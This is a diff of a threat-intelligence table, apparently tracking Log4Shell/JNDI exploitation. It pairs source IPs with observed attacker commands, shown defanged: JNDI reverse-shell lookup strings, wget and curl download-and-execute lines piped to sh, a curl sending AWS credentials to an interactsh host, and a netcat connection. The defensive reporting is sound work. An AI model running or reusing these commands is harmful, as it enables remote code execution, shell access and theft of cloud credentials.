@@ -32,7 +32,7 @@ JNDI Referenced Suspicious IP	Suspicious Behavior	Example Command/Download	Count
 95.179.164.209	JNDI Commons Beanutils Reverse Shell	${jndi:ldap:/95[.]179.164.209:443/Deserialization/CommonsBeanutils1/ReverseShell/95[.]179.164.209/8080}								<10
 5.249.162.249	Remote Code Download and Execution with Base64 encoded command	wget 54[.]37.93.31/x86; chmod 777 x86; ./x86 tokyo		1				1		
 132.226.170.154	Remote Code Download and Execution with Base64 encoded command	(curl http[:]//164[.]52.212.196:88/vc || wget -q -O- http[:]//164[.]52.212.196:88/vc) | sh	1	1						
-176.32.33.14	AWS Credential Harvesting with interactsh token	curl -d "$(cat ~/.aws/credentials)" https://<redacted token>.interactsh[.]com	<10							
+176.32.33.14	AWS Credential Harvesting with interactsh token	curl -d \"$(cat ~/.aws/credentials)\" https://<redacted token>.interactsh[.]com	<10							
 64.225.54.148	Reconnaissance with Base64 encoded command	curl http[:]//64[.]225.54.148/<redacted victim domain>	<10							
 159.223.5.30	JNDI Commons Beanutils Reverse Shell	${jndi:ldap://159[.]223.5.30:443/Deserialization/CommonsBeanutils1/ReverseShell/159[.]223.5.30/9998}								1
 139.59.138.109	Base64 Encoded netcat connection	nc 139[.]59.138.109 8080				1				
